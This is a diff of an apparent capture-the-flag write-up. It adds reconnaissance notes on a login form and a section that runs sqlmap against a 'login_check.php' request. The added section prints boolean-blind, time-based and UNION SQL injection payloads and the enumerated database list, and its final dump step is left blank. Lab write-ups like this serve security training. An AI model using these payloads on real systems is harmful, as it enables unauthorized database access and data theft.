@@ -54,16 +54,59 @@ Starting gobuster in directory enumeration mode
 /server-status        (Status: 403) [Size: 280]
 ```
 
-I checked the pages out and look around the website. It seems like the status of action we do will be reflected to us through the URL.
+I checked the pages out and look around the website. It seems like the status of action we do will be reflected to us through the URL with either.
 
 ![[Pasted image 20260208104705.png]]
 
-I  suspected that this challenge might be an SQL injection challenge. 
+![[Pasted image 20260208105516.png]]
+
+Checking out the `login.php`, whenever I tried an pair of credentials, the input are sent to `login_check.php` endpoint.
+
+Other than these two functions (sign up and login) the page does not have any other completed surfaces, so I suspect this might be an SQL injection challenge.
 
 ---
 
 ## Data Exfiltration
-Based on the things we observed
+Based on the previous assumption, I fired up `Burpsuite` and copied the request to `login_check.php` and use `SQLmap` to quickly identify the **SQLi vulnerability** and enumerate then dump the database.
+
+**Identify the databases:**
+```bash
+sqlmap -r request.txt -dbs
+
+[...]
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uname (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: uname=hello' AND 9961=9961 AND 'iVNU'='iVNU&password=12345678
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=hello' AND (SELECT 4899 FROM (SELECT(SLEEP(5)))BkhE) AND 'EIUD'='EIUD&password=12345678
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: uname=-6066' UNION ALL SELECT 36,CONCAT(0x716b6b7871,0x46727377506a6744484f4a5265467a4d6a785544734571704b6c4c57704873645875716f6a585075,0x71706b7171),36,36-- -&password=12345678
+---
+[10:59:23] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: PHP 8.0.30, Apache 2.4.56
+back-end DBMS: MySQL >= 5.0.12
+[10:59:23] [INFO] fetching database names
+available databases [6]:
+[*] BKSEC_TRAINING
+[*] information_schema
+[*] mysql
+[*] MYSQL_DATABASE
+[*] performance_schema
+[*] sys
+```
+
+**Dump the suspicious database:**
+```bash
+
+```
 
 ---
 
